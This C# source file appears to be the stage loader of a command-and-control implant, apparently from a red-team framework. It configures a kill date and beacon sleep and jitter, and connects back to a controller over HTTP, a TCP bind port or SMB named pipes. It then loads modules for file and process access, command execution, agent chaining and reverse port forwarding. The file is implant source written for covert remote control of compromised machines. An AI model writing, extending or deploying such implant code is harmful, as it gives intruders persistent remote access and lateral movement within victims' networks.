 using Agent.Modules;

using System;
using System.Net;

public class AgentStage
{
    static string AgentID;
    static string ParentAgentID;

    public static void HttpEntryPoint(string agentID, DateTime killDate, string connectHost, int connectPort, int sleepInterval, int sleepJitter)
    {
        AgentID = agentID;

        var config = new ConfigController();
        config.SetOption(ConfigSetting.KillDate, killDate);
        config.SetOption(ConfigSetting.SleepInterval, sleepInterval);
        config.SetOption(ConfigSetting.SleepJitter, sleepJitter);

        var commModule = new HttpCommModule(connectHost, connectPort);

        StartAgent(config, commModule);
    }

    public static void TcpEntryPoint(string agentID, string parentAgentID, DateTime killDate, string bindAddress, int bindPort)
    {
        AgentID = agentID;
        ParentAgentID = parentAgentID;

        var config = new ConfigController();
        config.SetOption(ConfigSetting.KillDate, killDate);

        var commModule = new TcpCommModule(IPAddress.Parse(bindAddress), bindPort);

        StartAgent(config, commModule);
    }

    public static void SmbEntryPoint(string agentID, string parentAgentID, DateTime killDate, string pipeName)
    {
        AgentID = agentID;
        ParentAgentID = parentAgentID;

        var config = new ConfigController();
        config.SetOption(ConfigSetting.KillDate, killDate);

        var commModule = new SmbCommModule();

        StartAgent(config, commModule);
    }

    private static void StartAgent(ConfigController config, ICommModule commModule)
    {
        var crypto = new CryptoController();

        commModule.Init(config, crypto);

        var agent = new AgentController(config, crypto, commModule);
        agent.Init(AgentID, ParentAgentID);
        
        agent.RegisterAgentModule(new CoreModule());
        agent.RegisterAgentModule(new SetModule());
        agent.RegisterAgentModule(new LinkModule());
        agent.RegisterAgentModule(new DirectoryModule());
        agent.RegisterAgentModule(new FileModule());
        agent.RegisterAgentModule(new DrivesModule());
        agent.RegisterAgentModule(new EnvModule());
        agent.RegisterAgentModule(new ProcessModule());
        agent.RegisterAgentModule(new ExecModule());
        agent.RegisterAgentModule(new RevPortFwdModule());

        agent.Start();
    }
}